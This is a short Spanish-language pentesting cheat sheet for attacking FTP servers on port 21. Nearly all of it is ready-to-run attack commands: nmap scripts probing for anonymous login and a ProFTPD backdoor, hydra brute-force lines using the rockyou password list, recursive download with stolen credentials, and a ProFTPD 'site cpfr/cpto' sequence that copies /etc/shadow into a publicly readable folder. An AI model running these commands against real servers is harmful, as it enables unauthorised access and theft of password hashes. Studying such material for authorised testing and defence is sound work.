---
title: "FTP (21)"
layout: "single"
category: "Servicios"
slug: "servicios/ftp"
date: "2025-11-26"
---

### Enumeración
```bash
nmap -p 21 --script ftp-anon,ftp-brute,ftp-proftpd-backdoor <IP>
nc -nv <IP> 21
```

### Fuerza Bruta
```bash
hydra -l user -P rockyou.txt ftp://<IP>
hydra -L users.txt -p pass ftp://<IP>
```

### Descarga Recursiva
```bash
wget -r --no-passive-ftp ftp://user:pass@<IP>/
```

### FTP Bounce / Site Copy
Copiar archivos internos a carpeta visible.
```bash
ftp <IP>
> site cpfr /etc/shadow
> site cpto /var/ftp/pub/shadow.txt
```
